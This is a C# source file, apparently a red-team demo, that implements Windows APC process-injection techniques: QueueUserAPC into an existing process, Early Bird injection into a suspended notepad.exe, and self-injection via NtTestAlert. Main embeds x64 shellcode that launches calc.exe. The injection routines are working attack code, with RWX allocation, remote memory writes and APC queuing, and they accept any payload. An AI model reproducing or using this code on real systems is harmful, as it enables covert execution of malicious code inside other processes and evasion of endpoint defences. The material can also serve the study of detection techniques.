using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ApcInjection;

class Program
{
    /// <summary>
    /// Injecte du code dans un processus existant en utilisant l'API QueueUserAPC.
    /// </summary>
    /// <param name="pid">L'ID du processus cible.</param>
    /// <param name="threadid">L'ID du thread principal du processus cible.</param>
    /// <param name="payload">Le code à injecter dans le processus cible.</param>
    public static void QueueUserAPC(uint pid, uint threadid, byte[] payload)
    {
        IntPtr processHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, false, pid);
        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open process.");
            return;
        }

        IntPtr baseAddress = WinApi.VirtualAllocEx(processHandle, IntPtr.Zero, (uint)payload.Length, WinApi.MEM_COMMIT |
            WinApi.MEM_RESERVE, WinApi.PAGE_EXECUTE_READWRITE);
        if (baseAddress == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory.");
            return;
        }

        WinApi.WriteProcessMemory(processHandle, baseAddress, payload, (uint)payload.Length, out uint bytesWritten);
        Console.WriteLine($"Remote base address: {baseAddress.ToString("X")}");

        IntPtr threadHandle = WinApi.OpenThread(WinApi.THREAD_ALL_ACCESS, true, threadid);
        if (threadHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open thread.");
            return;
        }

        WinApi.QueueUserAPC(baseAddress, threadHandle, IntPtr.Zero);
    }

    /// <summary>
    /// Injecte du code dans un processus nouvellement créé en mode suspendu, puis reprend son exécution.
    /// </summary>
    /// <param name="payload">Le code à injecter dans le processus cible.</param>
    public static void EarlyBirdAPC(byte[] payload)
    {
        WinApi.STARTUPINFO si = new WinApi.STARTUPINFO();
        WinApi.PROCESS_INFORMATION pi = new WinApi.PROCESS_INFORMATION();

        if (!WinApi.CreateProcessA(@"C:\Windows\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, WinApi.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
        {
            Console.WriteLine("Failed to create process.");
            return;
        }

        IntPtr baseAddress = WinApi.VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)payload.Length, WinApi.MEM_COMMIT | WinApi.MEM_RESERVE, WinApi.PAGE_EXECUTE_READWRITE);
        if (baseAddress == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory.");
            return;
        }

        WinApi.WriteProcessMemory(pi.hProcess, baseAddress, payload, (uint)payload.Length, out uint bytesWritten);
        QueueUserAPC(pi.dwProcessId, pi.dwThreadId, payload);

        WinApi.ResumeThread(pi.hThread);
    }

    /// <summary>
    /// Allocates memory in the current process and injects the payload using APC and NtTestAlert.
    /// </summary>
    /// <param name="payload">The shellcode to inject.</param>
    public static void SelfTestAlert(byte[] payload)
    {
        // Allocate memory in the current process and inject the payload using APC and NtTestAlert.
        IntPtr baseAddress = WinApi.VirtualAllocEx(Process.GetCurrentProcess().Handle, IntPtr.Zero, (uint)payload.Length, WinApi.MEM_COMMIT | WinApi.MEM_RESERVE, WinApi.PAGE_EXECUTE_READWRITE);
        if (baseAddress == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory.");
            return;
        }

        // Copy the payload into the allocated memory.
        Marshal.Copy(payload, 0, baseAddress, payload.Length);
        IntPtr currentThread = WinApi.GetCurrentThread();
        WinApi.QueueUserAPC(baseAddress, currentThread, IntPtr.Zero);
        // Force the current thread to execute the queued APC.
        WinApi.NtTestAlert();
    }

    static void Main(string[] args)
    {
        byte[] payload = new byte[]
        {
                // Payload bytes here
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00
        };

        SelfTestAlert(payload);
        Console.ReadKey();
    }
}